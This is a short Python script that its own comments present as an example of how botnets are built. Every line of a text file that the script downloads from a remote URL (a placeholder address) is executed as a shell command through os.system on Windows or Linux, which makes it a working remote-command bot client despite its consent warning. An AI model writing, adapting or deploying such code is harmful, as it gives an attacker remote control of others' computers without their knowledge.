#WARNING: Do not run this on a machine that you do not have strict consent from the user.

#In short, this is code that can potentially turn the computer into a bot. This is an example of the many ways that people can create botnets.
#this code looks in a text file and executes commands based on what is in it.
#for example, if the text file has 'dir' the code will tell windows to list a directory.
#you can also put multiple commands in the one text file.


import time
import os
import sys
import platform
import pathlib
import getpass
import wget


IP_Address = "http://8.8.8.8/example.txt"
commands = "example.txt"
username = getpass.getuser()
working_dir = pathlib.Path("C:\\Users\\", username, "stuff\\") 
Linux_working_dir = pathlib.Path("/tmp/stuff/")

def intro():                                                       
    version = platform.system()
    if version.lower() == "windows":
        print("platform is windows")
        time.sleep(1)
        windows_basic_setup()
        
    elif version.lower() == "linux":
        print("platform is linux")
        linux_basic_setup()
        
        
def windows_basic_setup():                                        #    checks if working directory already exists. 
    if working_dir.exists():
        print("working Dir already exists. Moving on.")
        time.sleep(1)
        
    else:
        print("working dir doesnt exist. Making now.")
        os.mkdir(working_dir)
        time.sleep(1)
    os.chdir(working_dir)
    Execute_Commands()
    
    
def linux_basic_setup():
    if Linux_working_dir.exists():
        print("working Dir already exists. Moving on.")
        time.sleep(1)
        
    else:
        print("working dir doesnt exist. Making now.")
        os.mkdir(Linux_working_dir)
        time.sleep(1)
    os.chdir(Linux_working_dir)
    Execute_Commands()

def Execute_Commands():
    if os.path.isfile(commands):
        print("updating file")
        os.remove(commands)
        
    else:
        print("No file found. downloading from remote server")
    wget.download(IP_Address)
    with open(commands, "r") as file:
        for line in file:
            print("--")
            os.system(line)


intro()
